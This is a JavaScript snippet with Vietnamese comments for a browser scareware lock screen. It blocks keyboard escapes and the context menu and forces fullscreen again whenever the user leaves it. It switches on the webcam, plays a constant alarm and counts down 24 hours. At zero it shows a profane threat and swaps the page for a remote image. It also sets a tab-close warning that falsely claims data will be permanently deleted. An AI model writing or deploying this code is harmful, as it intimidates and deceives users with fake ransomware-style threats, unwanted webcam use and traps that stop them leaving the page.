// Khóa mọi cách thoát
document.addEventListener('keydown', (e) => {
  if (
    e.key === 'Escape' ||
    e.key === 'F11' ||
    (e.ctrlKey && (e.key === 'w' || e.key === 'q' || e.key === 'r')) ||
    (e.ctrlKey && e.shiftKey && e.key === 'q')
  ) {
    e.preventDefault();
    e.stopPropagation();
  }
});
document.oncontextmenu = () => false;

// Fullscreen bắt buộc + khóa
function lock() {
  document.documentElement.requestFullscreen?.() ||
    document.documentElement.webkitRequestFullscreen?.() ||
    document.documentElement.msRequestFullscreen?.();
}
lock();
document.addEventListener('fullscreenchange', () => {
  !document.fullscreenElement && lock();
});

// Bật webcam thật (nếu cho phép)
navigator.mediaDevices
  .getUserMedia({ video: true })
  .then((stream) => {
    const cam = document.getElementById('webcam');
    cam.srcObject = stream;
    cam.style.display = 'block';
    setTimeout(() => (cam.style.border = '5px solid #f00'), 3000);
  })
  .catch(() => {});

// Âm thanh báo động liên tục
document.getElementById('alarm').play();

// Đếm ngược 24h
let time = 24 * 60 * 60 - 1;
const timer = document.getElementById('timer');
setInterval(() => {
  if (time-- <= 0) {
    document.body.classList.add('redscreen', 'shake');
    document.getElementById('finalscream').play();
    document.getElementById('lockscreen').innerHTML =
      '<h1 style="font-size:5rem;color:#f00;">MÀY ĐIÊU RỒI THẰNG LỒN<br>TAO ĐÉO THA CHO MÀY ĐÂU</h1>';
    setTimeout(() => {
      document.body.innerHTML =
        '<img src="https://i.imgur.com/8fK9mDh.jpeg" style="width:100vw;height:100vh;object-fit:cover;">';
      document.body.style.animation = 'none';
    }, 3000);
    return;
  }
  const h = String(Math.floor(time / 3600)).padStart(2, '0');
  const m = String(Math.floor((time % 3600) / 60)).padStart(2, '0');
  const s = String(time % 60).padStart(2, '0');
  timer.textContent = `${h}:${m}:${s}`;
}, 1000);

// Rung + đổi màu liên tục
setInterval(() => document.body.classList.add('shake'), 8000);
setInterval(() => document.body.classList.remove('shake'), 9000);

// Không cho tắt tab
window.onbeforeunload = () => 'DỮ LIỆU SẼ BỊ XÓA VĨNH VIỄN!';
